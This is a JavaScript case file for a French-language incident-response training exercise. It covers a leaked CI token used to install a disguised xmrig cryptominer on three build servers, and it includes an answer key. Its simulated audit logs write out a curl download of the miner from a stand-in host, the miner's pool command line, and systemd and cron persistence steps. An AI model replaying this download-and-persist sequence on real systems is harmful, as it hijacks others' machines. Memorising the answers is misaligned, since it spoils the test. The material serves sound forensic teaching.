/* Open-Forensics — CAS-06. AVERTISSEMENT : contient les réponses attendues. */
(function (root) {
  'use strict';

  root.OpenForensics.cases.push({
    id: 'CAS-06',
    title: 'Minage sur la chaîne d\'intégration continue',
    client: 'Solveig Software — éditeur de logiciels, 90 salariés',
    difficulty: 'moyen',
    estimatedMin: 55,
    tags: ['jeton fuité', 'CI/CD', 'cryptominage'],

    env: {
      domain: 'SOLVEIG', dns: 'solveig.lan', mail: 'solveig-software.example',
      lan: '10.60.1', edge: '198.51.100.90',
      hosts: ['runner-01', 'runner-02', 'runner-03', 'srv-git-01', 'srv-registry-01', 'pc-dev-04'],
      users: ['a.moreau', 'j.kaplan', 't.okoro', 'd.sylla'],
      admins: ['adm_plateforme']
    },

    brief: {
      saisine: 'Mardi 21 juillet 2026. L\'équipe plateforme constate depuis une semaine que les compilations prennent trois fois plus de temps. La supervision montre trois serveurs d\'intégration continue à 100 % de charge processeur en permanence, y compris la nuit et le week-end. La facture d\'hébergement du mois a doublé.',
      perimetre: 'Trois serveurs d\'exécution de tâches d\'intégration continue sous Linux, une forge logicielle interne, un registre d\'images. Les serveurs d\'exécution ont un accès sortant complet vers Internet, nécessaire aux dépendances.',
      collecte: 'Journaux de la forge et de la chaîne d\'intégration, journaux d\'audit système des trois serveurs d\'exécution, journal du pare-feu et journal du résolveur DNS, du 10 au 21 juillet. Horodatages en UTC.',
      limites: 'Le dépôt miroir public sur lequel le jeton a été exposé n\'appartient pas au client : son historique n\'est pas accessible à l\'investigation. On ne pourra donc pas dater précisément la première consultation du jeton par un tiers, seulement sa première utilisation.',
      mission: 'Déterminer comment un tiers a pu lancer des tâches sur la chaîne d\'intégration, ce qu\'il a déployé, sur combien de machines, et surtout si le code source ou les secrets de production ont été consultés. C\'est cette dernière question qui décidera d\'une notification aux clients de l\'éditeur.'
    },

    evidence: [
      {
        id: 'PJ-01', source: 'journaux', system: 'Forge logicielle',
        title: 'Journal d\'audit de la forge et de la chaîne d\'intégration',
        note: 'Trace les authentifications par jeton, les exécutions de pipelines et les accès aux dépôts. Le champ « token » donne le préfixe du jeton utilisé.',
        lines: [
          { t: '2026-07-14 16:22:08', m: 'event=push user=t.okoro repo=solveig/outils-internes branch=main commits=3 note="synchronisation vers le miroir public activee sur ce depot"' },
          { t: '2026-07-15 03:12:44', m: 'event=api_auth token=SLV-PAT-7f3a91 owner=t.okoro scopes=api,write_repository src_ip=198.51.100.140 user_agent="python-requests/2.31.0" result=success note="premiere utilisation depuis une adresse externe"' },
          { t: '2026-07-15 03:14:02', m: 'event=pipeline_created token=SLV-PAT-7f3a91 projet=infra-tf nom=maintenance-cache src_ip=198.51.100.140 declencheur=api' },
          { t: '2026-07-15 03:14:40', m: 'event=pipeline_run pipeline=5120 projet=infra-tf nom=maintenance-cache runner=runner-01 etape=script statut=success duree=212s' },
          { t: '2026-07-15 03:19:06', m: 'event=pipeline_run pipeline=5121 projet=infra-tf nom=maintenance-cache runner=runner-02 etape=script statut=success duree=198s' },
          { t: '2026-07-15 03:23:51', m: 'event=pipeline_run pipeline=5122 projet=infra-tf nom=maintenance-cache runner=runner-03 etape=script statut=success duree=204s' },
          { t: '2026-07-15 03:31:18', m: 'event=api_call token=SLV-PAT-7f3a91 methode=GET ressource=/api/v4/projects src_ip=198.51.100.140 result=success note="liste des projets"' },
          { t: '2026-07-18 02:41:09', m: 'event=pipeline_run pipeline=5390 projet=infra-tf nom=maintenance-cache runner=runner-01 etape=script statut=success duree=207s note="relance planifiee"' },
          { t: '2026-07-21 09:02:44', m: 'event=token_revoked token=SLV-PAT-7f3a91 actor=adm_plateforme raison="jeton expose publiquement"' }
        ],
        noise: [{ family: 'cicd', count: 320, from: '2026-07-10 05:00:00', to: '2026-07-21 18:00:00' }]
      },
      {
        id: 'PJ-02', source: 'journaux', system: 'runner-01, runner-02, runner-03',
        title: 'Journal d\'audit système des serveurs d\'exécution',
        note: 'auditd avec règles sur execve et sur les écritures dans /etc/systemd. Les tâches de la chaîne d\'intégration s\'exécutent sous l\'utilisateur root sur ces machines.',
        lines: [
          { t: '2026-07-15 03:14:55', m: 'host=runner-01 type=SYSCALL syscall=execve exe=/usr/bin/curl args="-sL -o /usr/local/bin/sysmetricsd https://mirror-binaries.test/pkg/xmrig-6.21.0-linux-x64" uid=0 ppid=2104 pcomm=bash' },
          { t: '2026-07-15 03:15:32', m: 'host=runner-01 type=PATH name=/usr/local/bin/sysmetricsd nametype=CREATE mode=0755 ouid=0 size=8812544 sha256=c97b3249974cb84105ef9af120c86cbb25aa89862ca911272ce7042628761c8f' },
          { t: '2026-07-15 03:15:40', m: 'host=runner-01 type=PATH name=/etc/systemd/system/sysmetricsd.service nametype=CREATE mode=0644 ouid=0' },
          { t: '2026-07-15 03:15:44', m: 'host=runner-01 type=SYSCALL syscall=execve exe=/usr/bin/systemctl args="enable --now sysmetricsd.service" uid=0 ppid=2104 pcomm=bash' },
          { t: '2026-07-15 03:15:58', m: 'host=runner-01 type=SYSCALL syscall=execve exe=/usr/local/bin/sysmetricsd args="-o pool-eu.miningx.test:3333 -u 4BkT9x2QmVr8Lp6ZsHc1Nd5Fy7Gq3Wj0Ae --tls --cpu-max-threads-hint=100" uid=0 ppid=1 pcomm=systemd' },
          { t: '2026-07-15 03:16:10', m: 'host=runner-01 type=PATH name=/etc/cron.d/sysmetrics nametype=CREATE mode=0644 ouid=0 note="@reboot /usr/bin/systemctl start sysmetricsd"' },
          { t: '2026-07-15 03:19:20', m: 'host=runner-02 type=PATH name=/usr/local/bin/sysmetricsd nametype=CREATE mode=0755 ouid=0 size=8812544 sha256=c97b3249974cb84105ef9af120c86cbb25aa89862ca911272ce7042628761c8f' },
          { t: '2026-07-15 03:24:05', m: 'host=runner-03 type=PATH name=/usr/local/bin/sysmetricsd nametype=CREATE mode=0755 ouid=0 size=8812544 sha256=c97b3249974cb84105ef9af120c86cbb25aa89862ca911272ce7042628761c8f' },
          { t: '2026-07-21 09:14:02', m: 'host=runner-01 type=SYSCALL syscall=execve exe=/usr/bin/systemctl args="stop sysmetricsd.service" uid=0 ppid=3301 pcomm=bash note="intervention equipe plateforme"' }
        ],
        noise: [{ family: 'auditd', count: 340, from: '2026-07-10 05:00:00', to: '2026-07-21 18:00:00', vars: { hosts: ['runner-01', 'runner-02', 'runner-03'] } }]
      },
      {
        id: 'PJ-03', source: 'reseau', system: 'Pare-feu périmétrique',
        title: 'Journal du pare-feu et synthèse de volumétrie',
        note: 'Les serveurs d\'exécution disposent d\'un accès sortant complet, indispensable au téléchargement des dépendances.',
        lines: [
          { t: '2026-07-15 03:14:56', m: 'src=10.60.1.11 dst=203.0.113.120 dport=443 proto=tcp action=ALLOW bytes_in=8812544 note="telechargement mirror-binaries.test"' },
          { t: '2026-07-15 03:16:02', m: 'src=10.60.1.11 dst=203.0.113.155 dport=3333 proto=tcp action=ALLOW state=ESTABLISHED note="session longue duree"' },
          { t: '2026-07-15 03:19:41', m: 'src=10.60.1.12 dst=203.0.113.155 dport=3333 proto=tcp action=ALLOW state=ESTABLISHED' },
          { t: '2026-07-15 03:24:22', m: 'src=10.60.1.13 dst=203.0.113.155 dport=3333 proto=tcp action=ALLOW state=ESTABLISHED' },
          { t: '2026-07-21 08:55:00', m: 'egress_summary window=2026-07-15/2026-07-21 hosts=10.60.1.11,10.60.1.12,10.60.1.13 dst_port=3333 total_bytes_out=41220118 total_bytes_in=18402551 sessions=3 note="trois sessions maintenues en continu pendant six jours"' },
          { t: '2026-07-21 08:55:01', m: 'egress_summary window=2026-07-15/2026-07-21 protocole=git-over-https src=10.60.1.0/24 total_bytes_out=1204418 note="volume conforme a l activite de compilation habituelle"' }
        ],
        noise: [{ family: 'firewall', count: 320, from: '2026-07-10 05:00:00', to: '2026-07-21 18:00:00' }]
      },
      {
        id: 'PJ-04', source: 'reseau', system: 'Résolveur DNS interne',
        title: 'Journal des résolutions DNS',
        note: 'Enregistre toutes les résolutions des serveurs internes, avec un compteur d\'occurrences par domaine.',
        lines: [
          { t: '2026-07-15 03:14:54', m: 'client=10.60.1.11 query=mirror-binaries.test type=A answer=203.0.113.120 rcode=NOERROR note="premiere resolution sur le parc"' },
          { t: '2026-07-15 03:16:01', m: 'client=10.60.1.11 query=pool-eu.miningx.test type=A answer=203.0.113.155 rcode=NOERROR note="premiere resolution sur le parc"' },
          { t: '2026-07-15 03:19:40', m: 'client=10.60.1.12 query=pool-eu.miningx.test type=A answer=203.0.113.155 rcode=NOERROR' },
          { t: '2026-07-21 08:40:12', m: 'client=10.60.1.13 query=pool-eu.miningx.test type=A answer=203.0.113.155 rcode=NOERROR count_since_first=8842' }
        ],
        noise: [{ family: 'dns', count: 300, from: '2026-07-10 05:00:00', to: '2026-07-21 18:00:00' }]
      },
      {
        id: 'PJ-05', source: 'journaux', system: 'Forge logicielle',
        title: 'Journal d\'accès aux dépôts et aux secrets',
        note: 'Trace toute lecture de dépôt, tout clonage et toute lecture de variable protégée, avec le jeton ou le compte à l\'origine.',
        lines: [
          { t: '2026-07-15 03:31:19', m: 'event=repo_list token=SLV-PAT-7f3a91 result=12_projets note="metadonnees uniquement, aucun contenu"' },
          { t: '2026-07-15 03:31:44', m: 'event=repo_clone_denied token=SLV-PAT-7f3a91 repo=solveig/produit-coeur raison="scope insuffisant : read_repository absent"' },
          { t: '2026-07-15 03:32:02', m: 'event=variable_read_denied token=SLV-PAT-7f3a91 projet=infra-tf variable=PROD_DB_PASSWORD raison="variable protegee, pipeline non protege"' },
          { t: '2026-07-16 22:11:30', m: 'event=repo_clone user=j.kaplan repo=solveig/produit-coeur src_ip=10.60.1.44 result=success note="activite de developpement normale"' },
          { t: '2026-07-21 09:03:10', m: 'event=audit_scope token=SLV-PAT-7f3a91 scopes_effectifs=api,write_repository clones=0 variables_lues=0 note="synthese produite lors de la revocation"' }
        ],
        noise: [{ family: 'cicd', count: 180, from: '2026-07-10 05:00:00', to: '2026-07-21 18:00:00' }]
      }
    ],

    questions: [
      { id: 'Q1', type: 'text', label: 'Identifiant du jeton utilisé par le tiers',
        answer: 'SLV-PAT-7f3a91',
        hint: 'Le journal d\'audit de la forge nomme le jeton à chaque appel d\'interface de programmation.',
        where: 'PJ-01, première authentification externe le 15 juillet à 03:12:44.',
        why: 'Le jeton est l\'identité de l\'attaquant dans ce dossier : toute son activité se recoupe par ce champ.' },

      { id: 'Q2', type: 'text', label: 'Compte propriétaire de ce jeton',
        answer: 't.okoro',
        hint: 'Le champ « owner » accompagne le jeton lors de l\'authentification.',
        where: 'PJ-01, owner=t.okoro — et le même compte a poussé la veille sur un dépôt synchronisé vers un miroir public.',
        why: 'Le propriétaire n\'est pas l\'auteur de l\'attaque : c\'est la victime d\'une fuite. La formulation du rapport doit l\'établir sans ambiguïté.' },

      { id: 'Q3', type: 'ip', label: 'Adresse IP depuis laquelle le jeton a été utilisé',
        answer: '198.51.100.140',
        hint: 'Elle apparaît sur toutes les lignes portant le jeton.',
        where: 'PJ-01, champ src_ip des évènements api_auth et pipeline_created.',
        why: 'Adresse externe, à 03h12 du matin, avec un agent utilisateur de script : trois signaux qui auraient suffi à alerter.' },

      { id: 'Q4', type: 'text', label: 'Nom du pipeline créé par le tiers',
        answer: 'maintenance-cache',
        hint: 'Un pipeline est créé deux minutes après la première authentification.',
        where: 'PJ-01, event=pipeline_created à 03:14:02.',
        why: 'Le nom est choisi pour se fondre dans les tâches d\'exploitation : c\'est ce qui lui a permis de tourner six jours sans question.' },

      { id: 'Q5', type: 'text', label: 'Nom sous lequel le mineur a été installé sur les serveurs',
        answer: 'sysmetricsd',
        hint: 'Un binaire est écrit dans /usr/local/bin avec un nom évoquant la supervision système.',
        where: 'PJ-02, création du fichier à 03:15:32 sur runner-01.',
        why: 'Le suffixe « d » et le vocabulaire de la métrologie visent à passer pour un démon système légitime dans une liste de processus.' },

      { id: 'Q6', type: 'domain', label: 'Domaine depuis lequel le binaire a été téléchargé',
        answer: 'mirror-binaries.test',
        hint: 'La commande de téléchargement figure dans le journal d\'audit système.',
        where: 'PJ-02 (argument de curl), confirmé par PJ-04 (première résolution).',
        why: 'L\'URL révèle en clair le logiciel réellement installé, malgré le renommage du fichier.' },

      { id: 'Q7', type: 'domain', label: 'Adresse du serveur de minage contacté',
        answer: 'pool-eu.miningx.test',
        hint: 'Une session est maintenue en continu vers un port inhabituel.',
        where: 'PJ-02 (argument -o du mineur), PJ-03 (port 3333) et PJ-04 (résolution).',
        why: 'Le serveur de collecte est l\'indicateur le plus durable : le binaire peut changer de nom, la destination beaucoup moins.' },

      { id: 'Q8', type: 'number', label: 'Port utilisé pour le minage',
        answer: '3333',
        hint: 'Le pare-feu montre trois sessions établies vers le même port.',
        where: 'PJ-03, lignes du 15 juillet et synthèse de volumétrie.',
        why: 'Un port non standard maintenu en session longue durée depuis un serveur de compilation est un motif de détection simple à mettre en place.' },

      { id: 'Q9', type: 'text', label: 'Portefeuille de destination du minage',
        answer: '4BkT9x2QmVr8Lp6ZsHc1Nd5Fy7Gq3Wj0Ae',
        hint: 'Le mineur reçoit le portefeuille en argument de ligne de commande.',
        where: 'PJ-02, argument -u de sysmetricsd à 03:15:58.',
        why: 'C\'est l\'élément qui permet de rattacher cet incident à d\'autres victimes du même opérateur, et de nourrir un dépôt de plainte.' },

      { id: 'Q10', type: 'text', label: 'Nom de l\'unité systemd assurant la persistance',
        answer: 'sysmetricsd.service', alt: ['sysmetricsd'],
        hint: 'Un fichier est créé dans /etc/systemd/system juste après le binaire.',
        where: 'PJ-02, création à 03:15:40 puis activation par systemctl enable --now.',
        why: 'Un second mécanisme existe en plus : une tâche cron au démarrage. Arrêter le service sans retirer les deux laisserait le mineur revenir au premier redémarrage.' },

      { id: 'Q11', type: 'number', label: 'Nombre de serveurs d\'exécution compromis',
        answer: '3',
        hint: 'Le même binaire, avec la même empreinte, apparaît sur plusieurs machines.',
        where: 'PJ-02, créations identiques sur runner-01, runner-02 et runner-03.',
        why: 'Les trois exécutions viennent du même pipeline : c\'est le fonctionnement normal de la chaîne d\'intégration, pas un déplacement latéral.' },

      { id: 'Q12', type: 'choice', label: 'Le code source ou les secrets de production ont-ils été consultés ?',
        answer: 'Non : les tentatives de clonage et de lecture de variable ont été refusées faute de droits',
        options: [
          'Oui : le dépôt produit-coeur a été cloné le 16 juillet',
          'Oui : la variable PROD_DB_PASSWORD a été lue',
          'Non : les tentatives de clonage et de lecture de variable ont été refusées faute de droits',
          'Indéterminable : la forge ne journalise pas les accès aux dépôts'
        ],
        hint: 'Le journal d\'accès aux dépôts distingue les opérations réussies des opérations refusées, et indique le motif du refus.',
        where: 'PJ-05 : repo_clone_denied et variable_read_denied le 15 juillet, synthèse à la révocation (clones=0, variables_lues=0). Le clonage réussi du 16 juillet est le fait d\'un développeur depuis une adresse interne.',
        why: 'C\'est la question qui décide d\'une notification aux clients de l\'éditeur. Le jeton portait les droits « api » et « write_repository » mais pas « read_repository » : une portée trop large aurait tout changé. Confondre le clonage légitime de j.kaplan avec celui de l\'attaquant conduirait à déclarer à tort une fuite de code source.' }
    ],

    events: [
      { id: 'EV-01', t: '2026-07-14 16:22', label: 'Publication sur un dépôt synchronisé vers un miroir public' },
      { id: 'EV-02', t: '2026-07-15 03:12', label: 'Première utilisation du jeton depuis une adresse externe' },
      { id: 'EV-03', t: '2026-07-15 03:14', label: 'Création du pipeline maintenance-cache par interface de programmation' },
      { id: 'EV-04', t: '2026-07-15 03:14', label: 'Téléchargement du mineur renommé sysmetricsd sur runner-01' },
      { id: 'EV-05', t: '2026-07-15 03:15', label: 'Création et activation de l\'unité systemd sysmetricsd.service' },
      { id: 'EV-06', t: '2026-07-15 03:16', label: 'Ouverture de la session de minage vers pool-eu.miningx.test' },
      { id: 'EV-07', t: '2026-07-15 03:31', label: 'Tentatives de clonage de dépôt et de lecture de secret, refusées' },
      { id: 'EV-08', t: '2026-07-16 22:11', label: 'Clonage du dépôt produit-coeur par un développeur depuis le réseau interne' },
      { id: 'EV-09', t: '2026-07-21 09:02', label: 'Révocation du jeton par l\'équipe plateforme' },
      { id: 'EV-10', t: '2026-07-18 02:41', label: 'Relance planifiée du pipeline de maintenance' }
    ],

    chain: [
      { tactic: 'Accès initial', event: 'EV-02', technique: 'T1078.004', techniqueAlt: ['T1078'],
        where: 'PJ-01, api_auth avec le jeton SLV-PAT-7f3a91 depuis 198.51.100.140.',
        why: 'Aucune vulnérabilité exploitée : un identifiant valide, exposé publiquement, suffit. C\'est le mode d\'entrée le plus courant sur les plateformes de développement.' },
      { tactic: 'Exécution', event: 'EV-04', technique: 'T1059.004',
        where: 'PJ-02, execve de curl puis du mineur sous l\'identité root, avec bash pour parent.',
        why: 'Les tâches d\'intégration s\'exécutent en root : obtenir un pipeline, c\'est obtenir une exécution privilégiée sur trois serveurs.' },
      { tactic: 'Persistance', event: 'EV-05', technique: 'T1543.002', techniqueAlt: ['T1053.003'],
        where: 'PJ-02, unité systemd créée et activée, doublée d\'une tâche cron au démarrage.',
        why: 'Deux mécanismes redondants : c\'est ce qui fait qu\'un simple « systemctl stop » ne suffit pas à éradiquer.' },
      { tactic: 'Élévation de privilèges', event: 'NONE', technique: 'NONE',
        where: 'Inutile : les tâches d\'intégration tournent déjà sous l\'identité root sur ces serveurs.',
        why: 'Le vrai problème est de configuration, pas d\'attaque : un exécuteur de tâches ne devrait pas fonctionner en root.' },
      { tactic: 'Contournement des défenses', event: 'EV-04', technique: 'T1036.005',
        where: 'PJ-02, binaire xmrig écrit sous le nom sysmetricsd dans /usr/local/bin.',
        why: 'Le renommage suffit à tromper une lecture rapide de la liste des processus, et c\'est pour cela que le dossier a mis six jours à remonter.' },
      { tactic: 'Accès aux identifiants', event: 'NONE', technique: 'NONE',
        where: 'PJ-05 : la lecture de la variable protégée PROD_DB_PASSWORD est refusée, aucun autre secret n\'est touché.',
        why: 'La protection des variables sensibles a tenu. C\'est le seul contrôle qui a fonctionné dans ce dossier, et il mérite d\'être signalé comme tel.' },
      { tactic: 'Découverte', event: 'EV-07', technique: 'T1526', techniqueAlt: ['T1087.004', 'T1082'],
        where: 'PJ-01 et PJ-05, listage des douze projets accessibles au jeton.',
        why: 'La reconnaissance se limite aux métadonnées : l\'opérateur a vérifié ce que son jeton permettait, a constaté que le code lui échappait, et s\'est rabattu sur le calcul.' },
      { tactic: 'Déplacement latéral', event: 'NONE', technique: 'NONE',
        where: 'Les trois serveurs exécutent le même pipeline : aucune connexion de machine à machine n\'apparaît dans les journaux d\'audit.',
        why: 'Piège classique : trois machines touchées ne signifient pas déplacement latéral. Ici, la chaîne d\'intégration a distribué la charge elle-même, comme elle est conçue pour le faire.' },
      { tactic: 'Collecte', event: 'NONE', technique: 'NONE',
        where: 'Aucun archivage, aucune lecture de contenu de dépôt.',
        why: 'Cohérent avec le refus de clonage : il n\'y avait rien à collecter avec ce niveau de droits.' },
      { tactic: 'Commande et contrôle', event: 'EV-06', technique: 'T1071.001', techniqueAlt: ['T1571'],
        where: 'PJ-03, sessions maintenues vers le port 3333 ; PJ-04, résolutions répétées du domaine du serveur de minage.',
        why: 'Pour un mineur, le serveur de collecte tient lieu de canal de commande : c\'est lui qui distribue le travail à effectuer.' },
      { tactic: 'Exfiltration', event: 'NONE', technique: 'NONE',
        where: 'PJ-03 : 41 Mo sortants en six jours sur le port de minage, soit le trafic de protocole, et un volume de clonage conforme à l\'activité de développement habituelle.',
        why: 'Quarante mégaoctets en six jours pour trois machines, c\'est la signature d\'un protocole de minage, pas d\'un transfert de code source.' },
      { tactic: 'Impact', event: 'EV-06', technique: 'T1496',
        where: 'Supervision du client : trois serveurs à 100 % de charge, compilations trois fois plus lentes, facture d\'hébergement doublée.',
        why: 'L\'impact est économique et opérationnel : c\'est lui qui a déclenché la découverte, six jours après les faits. Aucune donnée n\'a été touchée.' }
    ],

    keyIndicators: ['SLV-PAT-7f3a91', '198.51.100.140', 'sysmetricsd', 'pool-eu.miningx.test', '4BkT9x2QmVr8Lp6ZsHc1Nd5Fy7Gq3Wj0Ae', 'mirror-binaries.test', 'maintenance-cache'],

    iocs: [
      { type: 'Jeton', value: 'SLV-PAT-7f3a91', context: 'Jeton d\'accès personnel exposé publiquement, révoqué le 21 juillet.' },
      { type: 'Adresse IP', value: '198.51.100.140', context: 'Source de toutes les utilisations frauduleuses du jeton.' },
      { type: 'Domaine', value: 'mirror-binaries.test', context: 'Distribution du mineur renommé.' },
      { type: 'Domaine', value: 'pool-eu.miningx.test', context: 'Serveur de minage, port 3333, sessions longue durée.' },
      { type: 'Empreinte SHA-256', value: 'c97b3249974cb84105ef9af120c86cbb25aa89862ca911272ce7042628761c8f', context: 'Binaire xmrig installé sous le nom sysmetricsd.' },
      { type: 'Portefeuille', value: '4BkT9x2QmVr8Lp6ZsHc1Nd5Fy7Gq3Wj0Ae', context: 'Destination des gains de minage.' },
      { type: 'Nom de service', value: 'sysmetricsd.service', context: 'Unité systemd de persistance, doublée d\'une tâche cron @reboot.' }
    ],

    debrief: {
      story: 'Le 14 juillet, un développeur pousse trois commits sur un dépôt interne dont la synchronisation vers un miroir public était activée ; un jeton d\'accès personnel s\'y trouve. Onze heures plus tard, à 03h12, ce jeton est utilisé depuis 198.51.100.140 avec un client Python. En deux minutes, un pipeline nommé maintenance-cache est créé dans le projet d\'infrastructure. Il s\'exécute successivement sur les trois serveurs d\'intégration : téléchargement de xmrig depuis mirror-binaries.test, installation sous le nom sysmetricsd dans /usr/local/bin, création d\'une unité systemd et d\'une tâche cron au démarrage, puis ouverture d\'une session de minage vers pool-eu.miningx.test sur le port 3333. À 03h31, l\'opérateur tente de cloner le dépôt du produit et de lire le mot de passe de la base de production : les deux sont refusés, le jeton ne portant pas les droits de lecture de dépôt. Le minage tourne six jours, jusqu\'à ce que la lenteur des compilations et la facture d\'hébergement alertent l\'équipe. Aucun code source, aucun secret de production n\'a été consulté.',
      lessons: [
        'La portée d\'un jeton est ce qui a sauvé le client. Le même jeton avec le droit de lecture de dépôt aurait transformé un incident de facturation en fuite de propriété intellectuelle. Le principe du moindre privilège se démontre ici en une ligne de journal.',
        'Trois machines touchées ne font pas un déplacement latéral. La chaîne d\'intégration a distribué le travail comme elle est faite pour le faire : qualifier cela de propagation fausserait la description de la menace.',
        'La persistance est double — unité systemd et tâche cron. Un arrêt de service laisse le second mécanisme intact. L\'éradication exige de les chercher tous les deux.',
        'Le journal d\'audit de la forge distingue les opérations refusées des opérations réussies, et donne le motif du refus. C\'est exactement ce qui permet de répondre « non » à la question la plus lourde du dossier, au lieu de répondre « on ne sait pas ».'
      ],
      pitfalls: [
        'Mettre en cause t.okoro comme auteur : il est propriétaire du jeton et victime de sa fuite, ce qui est très différent.',
        'Attribuer à l\'attaquant le clonage du dépôt produit-coeur du 16 juillet, qui provient d\'une adresse interne et d\'un compte de développeur.',
        'Conclure à une exfiltration de code parce que 41 Mo sont sortis : c\'est le trafic du protocole de minage, réparti sur six jours et trois machines.',
        'Considérer l\'incident clos après l\'arrêt du service, sans retirer le binaire, l\'unité systemd et la tâche cron sur les trois serveurs.'
      ]
    }
  });
})(typeof globalThis !== 'undefined' ? globalThis : this);
